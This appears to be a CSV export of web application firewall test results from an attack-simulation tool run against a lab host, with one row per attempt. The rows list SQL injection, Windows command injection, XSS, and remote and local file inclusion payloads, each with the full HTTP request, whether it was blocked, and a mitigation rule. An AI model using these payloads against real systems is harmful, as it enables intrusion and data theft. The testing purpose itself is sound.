"Source","Timestamp","Attack Type","URL","Action","Method","Payload","Input Name","Risk","Display URL","Status","Sub Category","Mitigation","Previous Status","Redirected","Full Request","Platform","Database"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:22","SQL Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post",")) or benchmark(10000000,MD5(1))#","tel","high","https://ekslabs.cymulatedev.com","blocked","Blind SQL Injection","Create a WAF Security rule to block incoming requests that contains:)) or benchmark(10000000,MD5(1))#.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Blind SQL Injection signature pack (SQL Injection)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 325
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":"""",""tel"":"")) or benchmark(10000000,MD5(1))#"",""hidden"":""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:22","SQL Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","+or+isnull%281%2F0%29+%2F*","tel","high","https://ekslabs.cymulatedev.com","blocked","Passive SQL Injection","Create a WAF Security rule to block incoming requests that contains:+or+isnull%281%2F0%29+%2F*.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Passive SQL Injection signature pack (SQL Injection)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 318
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":"""",""tel"":""+or+isnull%281%2F0%29+%2F*"",""hidden"":""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:21","Command Injection","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","$+|+Dir+c:%255c","N/A","high","https://ekslabs.cymulatedev.com?eq071lcfx03jp=$+|+Dir+c:%255c","penetrated","Command Injection - Windows","Create a WAF Security rule to block incoming requests that contains:$+|+Dir+c:%255c.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Command Injection - Windows signature pack (Command Injection)","N/A","N/A","GET /?eq071lcfx03jp=$+|+Dir+c:%255c HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","windows","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:21","XSS","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","'><iframe/ ""onload=alert(1)></iframe>","hidden","low","https://ekslabs.cymulatedev.com","blocked","Generic XSS","Create a WAF Security rule to block incoming requests that contains:'><iframe/ ""onload=alert(1)></iframe>.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Generic XSS signature pack (XSS)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 74
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":"""",""tel"":"""",""hidden"":""'><iframe/ \""onload=alert(1)></iframe>""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:21","File Inclusion","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","/FirstPost/block.php?Include=https://app.cymulate.com","N/A","medium","https://ekslabs.cymulatedev.com/FirstPost/block.php?Include=https://app.cymulate.com","blocked","Remote File Inclusion","Create a WAF Security rule to block incoming requests that contains:/FirstPost/block.php?Include=https://app.cymulate.com.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Remote File Inclusion signature pack (File Inclusion)","N/A","N/A","GET /FirstPost/block.php?Include=https://app.cymulate.com HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:20","File Inclusion","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","\Program Files (x86)\Apache Group\Apache\logs\access.log","N/A","medium","https://ekslabs.cymulatedev.com\Program Files (x86)\Apache Group\Apache\logs\access.log","blocked","Local File Inclusion","Create a WAF Security rule to block incoming requests that contains:\Program Files (x86)\Apache Group\Apache\logs\access.log.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Local File Inclusion signature pack (File Inclusion)","N/A","N/A","GET /Program%20Files%20(x86)/Apache%20Group/Apache/logs/access.log HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","windows","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:20","File Inclusion","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","/usr/local/apache/logs/error.log","N/A","medium","https://ekslabs.cymulatedev.com/usr/local/apache/logs/error.log","blocked","Local File Inclusion","Create a WAF Security rule to block incoming requests that contains:/usr/local/apache/logs/error.log.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Local File Inclusion signature pack (File Inclusion)","N/A","N/A","GET /usr/local/apache/logs/error.log HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","linux","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:20","XSS","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","post","&lt;BODY BACKGROUND=""javascript:alert(1)""&gt;","password","low","https://ekslabs.cymulatedev.com","blocked","Generic XSS","Create a WAF Security rule to block incoming requests that contains:&lt;BODY BACKGROUND=""javascript:alert(1)""&gt;.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Generic XSS signature pack (XSS)","N/A","N/A","POST / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Content-Length: 339
Host: ekslabs.cymulatedev.com
Connection: keep-alive


{""password"":""&lt;BODY BACKGROUND=\""javascript:alert(1)\""&gt;"",""tel"":"""",""hidden"":""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""}","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:20","File Inclusion","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","/0_admin/modules/Wochenkarte/frontend/index.php?x_admindir=https://app.cymulate.com","N/A","medium","https://ekslabs.cymulatedev.com/0_admin/modules/Wochenkarte/frontend/index.php?x_admindir=https://app.cymulate.com","blocked","Remote File Inclusion","Create a WAF Security rule to block incoming requests that contains:/0_admin/modules/Wochenkarte/frontend/index.php?x_admindir=https://app.cymulate.com.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Remote File Inclusion signature pack (File Inclusion)","N/A","N/A","GET /0_admin/modules/Wochenkarte/frontend/index.php?x_admindir=https://app.cymulate.com HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","OS Agnostic","DB Agnostic"
"https://ekslabs.cymulatedev.com","03/01/2023 09:35:20","File Inclusion","https://ekslabs.cymulatedev.com","https://ekslabs.cymulatedev.com","get","\xampp\apache\bin\php.ini","N/A","medium","https://ekslabs.cymulatedev.com\xampp\apache\bin\php.ini","blocked","Local File Inclusion","Create a WAF Security rule to block incoming requests that contains:\xampp\apache\bin\php.ini.
The rule could be a Regular expression that needs to be implemented or an update of your WAF.
Validate that the specific input/url is protected with the Local File Inclusion signature pack (File Inclusion)","N/A","N/A","GET /xampp/apache/bin/php.ini HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Host: ekslabs.cymulatedev.com
Connection: keep-alive

","windows","DB Agnostic"
